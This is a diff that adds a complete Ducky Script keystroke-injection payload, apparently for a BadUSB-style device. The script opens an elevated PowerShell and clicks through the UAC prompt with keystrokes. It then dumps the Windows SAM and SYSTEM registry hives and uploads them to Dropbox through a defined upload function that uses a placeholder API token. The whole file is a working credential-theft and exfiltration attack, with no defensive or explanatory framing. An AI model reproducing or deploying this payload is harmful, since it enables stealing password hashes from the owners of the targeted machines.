@@ -1,0 +1,17 @@
+DELAY 750
+WINDOWS d
+DELAY 1000
+WINDOWS r
+DELAY 1000
+STRING powershell Start-Process powershell -Verb runAs
+ENTER
+DELAY 5000
+LEFTARROW
+ENTER
+DELAY 3000
+STRING function DropBox-Upload {[CmdletBinding()]param ([Parameter(Mandatory=$True,ValueFromPipeline=$True)][Alias("f")][string]$SourceFilePath)$DropBoxAccessToken="DROPBOX_API_KEY_HERE";$outputFile=Split-Path $SourceFilePath -leaf;$TargetFilePath="/$outputFile";$arg='{ "path": "'+$TargetFilePath+'", "mode": "add", "autorename": true, "mute": false }';$authorization="Bearer "+$DropBoxAccessToken;$headers=New-Object "System.Collections.Generic.Dictionary[[String],[String]]";$headers.Add("Authorization",$authorization);$headers.Add("Dropbox-API-Arg",$arg);$headers.Add("Content-Type",'application/octet-stream');Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile $SourceFilePath -Headers $headers}; reg save HKLM\sam ./sam.save; reg save HKLM\system ./system.save
+ENTER
+DELAY 1500
+STRING "sam.save" | DropBox-Upload; "system.save" | DropBox-Upload
+ENTER
+WINDOWS d
